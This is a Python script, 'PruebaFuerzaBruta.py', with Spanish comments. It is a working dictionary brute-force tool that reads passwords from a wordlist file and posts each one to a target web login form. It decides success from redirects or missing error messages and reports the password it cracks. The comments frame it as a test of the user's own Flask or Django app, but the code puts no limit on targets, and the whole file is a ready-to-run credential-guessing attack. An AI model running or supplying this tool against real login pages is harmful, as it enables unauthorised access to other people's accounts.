import requests
import sys

class AutenticadorWeb:
    def __init__(self, url_login):
        self.url = url_login
        # Usamos una sesión para mantener las cookies si el login es exitoso
        self.sesion = requests.Session()        

    def iniciar_sesion(self, usuario, contrasena):
        """
        Envía las credenciales al formulario web de forma automática.
        """
        # Los 'keys' del diccionario deben coincidir exactamente con el atributo 'name' del HTML
        datos_formulario = {
            'username': usuario,
            'password': contrasena
        }
        
        try:
            # allow_redirects=True permite que requests siga la redirección post-login
            respuesta = self.sesion.post(self.url, data=datos_formulario, allow_redirects=True)
            
            if respuesta.status_code == 200:
                # ESTRATEGIA 1: Buscar texto de error en el HTML recibido
                # Cambia "incorrecto" o "error" por el mensaje real que muestre tu app Flask/Django
                errores_comunes = ["incorrecto", "inválido", "error", "failed", "Usuario o contrasena incorrectos."]
                
                if any(error in respuesta.text.lower() for error in errores_comunes):
                    print("❌ Error de autenticación: Credenciales incorrectas.")
                    return False
                
                # ESTRATEGIA 2: Verificar si la URL cambió (Redirección exitosa, ej: a /dashboard o /home)
                if respuesta.url != self.url:
                    print(f"✅ Login exitoso. Redirigido a: {respuesta.url}")
                    return True
                
                # Si no hay error evidente pero seguimos en la misma URL de login...
                print("⚠️ Se recibió un 200, pero sigues en la página de login. Probablemente falló.")
                return False
            else:
                print(f"❌ Error del servidor. Código: {respuesta.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Error de conexión: {e}")
            return False

class DiccionarioClaves:
    def __init__(self, ruta_archivo):
        self.ruta = ruta_archivo

    def obtener_claves(self):
        with open(self.ruta, "r", encoding="utf-8") as f:
            for linea in f:
                yield linea.strip()

# ==========================================
# EJEMPLO DE USO
# ==========================================
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print('Uso: py PruebaFuerzaBruta.py <USUARIO> <URL> <RUTA_DICCIONARIO>')	
        sys.exit(1)
    
    URL_OBJETIVO = sys.argv[2]  # Ejemplo: "http://xxxxx:5000/login"
    
    # 1. Instanciamos el objeto con la URL del formulario
    bot_login = AutenticadorWeb(URL_OBJETIVO)
    
    # 2. Abrimos el diccionario
    diccionario = DiccionarioClaves(sys.argv[3])

    # 2. Ejecutamos el autorrelleno y envío
    for clave in diccionario.obtener_claves():
        print(f"Probando contraseña: {clave}")
        resultado = bot_login.iniciar_sesion(usuario=sys.argv[1], contrasena=clave)
        if resultado:
        # Aquí comprobamos el exito de la autenticación
            print(f"Contraseña {clave} encontrada.")
            break
    
    # 3. Si no encontramos la clave
    if not resultado:
        print("Clave no encontrada.")